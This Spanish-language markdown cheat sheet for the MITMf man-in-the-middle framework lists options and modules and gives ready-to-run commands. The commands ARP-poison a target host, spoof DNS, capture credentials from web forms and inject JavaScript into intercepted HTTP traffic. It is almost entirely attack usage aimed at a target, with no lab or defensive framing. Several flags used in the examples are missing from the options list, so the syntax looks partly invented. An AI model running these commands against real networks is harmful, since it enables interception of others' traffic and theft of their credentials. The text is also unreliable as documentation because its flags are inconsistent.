### **Network_Security/MITMF/mitmf.md**

# MITMF

## Descripción

`MITMF` (Man-in-the-Middle Framework) es una herramienta de seguridad que facilita la realización de ataques de hombre en el medio (MITM). Proporciona una plataforma modular para interceptar, manipular y analizar el tráfico de red entre clientes y servidores. Incluye plugins para ataques específicos como inyección de contenido, sniffing de contraseñas y más.

## Uso

```bash
sudo mitmf [opciones]
```

### Opciones principales

- `--arp`: Realiza envenenamiento ARP para MITM.
- `--spoof`: Activa el spoofing de DNS o HTTP.
- `--inject`: Inyecta contenido en el tráfico interceptado.
- `--sniff`: Habilita la captura de credenciales y datos sensibles.
- `-i interfaz`: Define la interfaz de red a utilizar.
- `-t objetivo`: Especifica la dirección IP del objetivo.
- `--help`: Muestra la ayuda y las opciones disponibles.

## Módulos comunes

- `dns_spoof`: Spoofing de respuestas DNS para redirigir el tráfico.
- `inject_html`: Inyecta código HTML malicioso en páginas web.
- `capture_credentials`: Captura credenciales enviadas a través de formularios web.
- `inject_javascript`: Inyecta scripts JavaScript en el tráfico HTTP.

## Ejemplos

- **Realizar un ataque ARP MITM en la interfaz eth0:**
  ```bash
  sudo mitmf --arp --gateway 192.168.1.1 --target 192.168.1.100 -i eth0
  ```

- **Activar el spoofing de DNS y capturar credenciales:**
  ```bash
  sudo mitmf --arp --dns --capture --target 192.168.1.100 -i wlan0
  ```

- **Inyectar un script JavaScript en el tráfico HTTP:**
  ```bash
  sudo mitmf --arp --inject-javascript 'alert("MITM Attack")' --target 192.168.1.100 -i wlan0
  ```

- **Realizar un ataque completo con envenenamiento ARP y spoofing DNS:**
  ```bash
  sudo mitmf --arp --spoof --dns --target 192.168.1.100 -i eth0
  ```
